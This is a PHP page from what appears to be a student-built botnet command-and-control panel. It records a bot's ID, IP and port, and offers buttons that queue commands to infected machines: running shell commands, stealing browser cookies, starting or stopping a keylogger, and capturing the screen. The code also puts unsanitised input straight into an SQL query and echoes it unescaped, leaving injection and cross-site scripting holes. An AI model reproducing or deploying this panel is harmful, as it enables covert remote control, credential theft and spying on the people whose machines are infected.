<?php
if ((isset($_GET['ID']) && !empty($_GET['ID'])) && (isset($_GET['ip']) && !empty($_GET['ip'])) && (isset($_GET['port']) && !empty($_GET['port']))) {
    $ID =  $_GET['ID'];
    $ip =  $_GET['ip'];
    $port =  $_GET['port'];
} else if ((isset($_POST['ID']) && !empty($_POST['IDp'])) && (isset($_POST['ip']) && !empty($_POST['ip'])) && (isset($_POST['port']) && !empty($_POST['port']))) {
    $ID =  $_POST['ID'];
    $ip =  $_POST['ip'];
    $port =  $_POST['port'];
} else {
    $bot = 'no bot';
}
$fp = fopen('botActive.txt', 'w');
fwrite($fp, $ID);
fwrite($fp, '&');
fwrite($fp, $ip);
fwrite($fp, '&');
fwrite($fp, $port);
fclose($fp);
$link = mysqli_connect("localhost", "root", "") or die("Khong the ket noi den CSDL MYSQL");
mysqli_select_db($link, "pbl4_v2");
$sql = "SELECT * FROM botes WHERE ID='$ID'";
$result = mysqli_query($link, $sql);
$row = mysqli_fetch_assoc($result);
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" type="text/css" href="../css/copy.css">
    <link rel="stylesheet" type="text/css" href="../css/openBot.css">
    <script src="https://kit.fontawesome.com/yourcode.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <title>Open Bot</title>
    <style>
        body {
            background-image: url('../img/botactive.png');
            /* background-size: cover; */
            margin: 0;
            padding: 0;
            margin-top: 30px;
        }

        form {
            display: flex;
            flex-direction: row;
            margin: 0;
            padding: 0;
        }
    </style>
</head>

<body>
    <form method="post" action="openBot.php?ID=<?php echo $ID ?>&ip=<?php echo $ip ?>&port=<?php echo $port ?>" id="cmdform">
        <div class="inputCommand">
            <div class="header">
                <ul class="ul_header">
                    <li class="li_header label_header">
                        <label for="">Control Bot</label>
                    </li>
                </ul>
                <ul class="ul_header">
                    <li class="li_header li_header_icon">
                        <i class="fa-solid fa-minus" style="color: #000000;"></i>
                    </li>
                    <li class="li_header li_header_icon">
                        <i class="fa-regular fa-square" style="color: #000000;"></i>
                    </li>
                    <li class="li_header li_header_icon">
                        <i class="fa-solid fa-x" style="color: #000000;"></i>
                    </li>
                </ul>
            </div>
            <ul class="ul_input ul_input_first">
                <li class="li_input label_input">
                    <label for="">IP BOT</label>
                </li>
                <li class="li_input">
                    <input class="input_input" type="text" name="ip" readonly value="<?php echo $ip ?>">
                </li>
            </ul>
            <ul class="ul_input">
                <li class="li_input label_input">
                    <label for="">PORT BOT</label>
                </li>
                <li class="li_input">
                    <input class="input_input" type="text" name="port" readonly value="<?php echo $port;
                                                                                        mysqli_close($link); ?>" />
                </li>
            </ul>
            <ul class="ul_input">
                <li class="li_input label_input">
                    <label for="">COMMAND BOT</label>
                </li>
                <li class="li_input">
                    <input class="input_input" type="text" name="cmdstr">
                </li>
            </ul>
            <table class="container">
                <caption>Guide Table</caption>
                <tr>
                    <th>Command</th>
                    <th>Button</th>
                    <th>Content</th>
                </tr>
                <tr>
                    <td>getcmd</td>
                    <td>Execute Cmd</td>
                    <td></td>
                </tr>
                <tr>
                    <td>getcookie</td>
                    <td>Execute Cookie</td>
                    <td></td>
                </tr>
                <tr>
                    <td>start keylogger</td>
                    <td>Execute Keylogger</td>
                    <td></td>
                </tr>
                <tr>
                    <td>stop keylogger</td>
                    <td>Execute Keylogger</td>
                    <td></td>
                </tr>
                <tr>
                    <td>getcapture</td>
                    <td>Execute Capture</td>
                    <td></td>
                </tr>
            </table>
        </div>
        <div class="btnSubmit">
            <ul class="ul_btn">
                <li class="li_btn">
                    <i class="fa-solid fa-laptop btn_icon" style="color: #43e123;"></i>
                    <p><input type="submit" class="btn_submit" name="buttonCmd" value="Cmd"></p>
                </li>
                <li class="li_btn">
                    <i class="fa-solid fa-link btn_icon" style="color: #38d72d;"></i>
                    <p><input type="submit" class="btn_submit" name="buttonCookie" value="Cookie"></p>
                </li>
            </ul>
            <ul class="ul_btn">
                <li class="li_btn">
                    <i class="fa-solid fa-keyboard btn_icon" style="color: #31cf26;"></i>
                    <p><input type="submit" class="btn_submit" name="buttonKeylogger" value="Keylogger"></p>
                </li>
                <li class="li_btn">
                    <i class="fa-regular fa-image btn_icon" style="color: #2adf36;"></i>
                    <p><input type="submit" class="btn_submit" name="buttonCapture" value="Capture"></p>
                </li>
            </ul>
            <ul class="ul_btn">
                <li class="li_btn li_btn_return">
                    <i class="fa-solid fa-rotate-left btn_icon" style="color: #37d534;"></i>
                    <p><a href="../php/indexBotActive.php">Return</a></p>
                </li>
            </ul>

        </div>
    </form>
</body>

</html>
<?php
if (isset($_POST['buttonCmd'])) {
    $db = new mysqli('localhost', 'root', '', 'pbl4_v2');
    if (mysqli_connect_errno()) exit;
    if (isset($_POST['cmdstr']) && !empty($_POST['cmdstr'])) {
        $cmdstr = $_POST['cmdstr']; //dữ liệu trong input
        echo 'Received: ' . $cmdstr . '<br>';
        $fp = fopen('commandBot.txt', 'w');
        fwrite($fp, "getcmd");
        fwrite($fp, '&');
        fwrite($fp, $cmdstr);
        fclose($fp);
    }
} else if (isset($_POST['buttonCookie'])) {
    $db = new mysqli('localhost', 'root', '', 'pbl4_v2');
    if (mysqli_connect_errno()) exit;
    if (isset($_POST['cmdstr']) && !empty($_POST['cmdstr'])) {
        $cmdstr = $_POST['cmdstr']; //dữ liệu trong input
        echo 'Received: ' . $cmdstr . '<br>';
        $fp = fopen('commandBot.txt', 'w');
        fwrite($fp, "getcookie");
        fwrite($fp, '&');
        fwrite($fp, $cmdstr);
        fclose($fp);
    }
} else if (isset($_POST['buttonKeylogger'])) {
    $db = new mysqli('localhost', 'root', '', 'pbl4_v2');
    if (mysqli_connect_errno()) exit;
    if (isset($_POST['cmdstr']) && !empty($_POST['cmdstr'])) {
        $cmdstr = $_POST['cmdstr'];
        echo 'Received: ' . $cmdstr . '<br>';
        $fp = fopen('commandBot.txt', 'w');
        fwrite($fp, "getkeylogger");
        fwrite($fp, '&');
        fwrite($fp, $cmdstr);
        fclose($fp);
    }
} else if (isset($_POST['buttonCapture'])) {
    $db = new mysqli('localhost', 'root', '', 'pbl4_v2');
    if (mysqli_connect_errno()) exit;
    if (isset($_POST['cmdstr']) && !empty($_POST['cmdstr'])) {
        $cmdstr = $_POST['cmdstr']; //dữ liệu trong input
        echo 'Received: ' . $cmdstr . '<br>';
        $fp = fopen('commandBot.txt', 'w');
        fwrite($fp, "getcapture");
        fwrite($fp, '&');
        fwrite($fp, $cmdstr);
        fclose($fp);
    }
} 
?>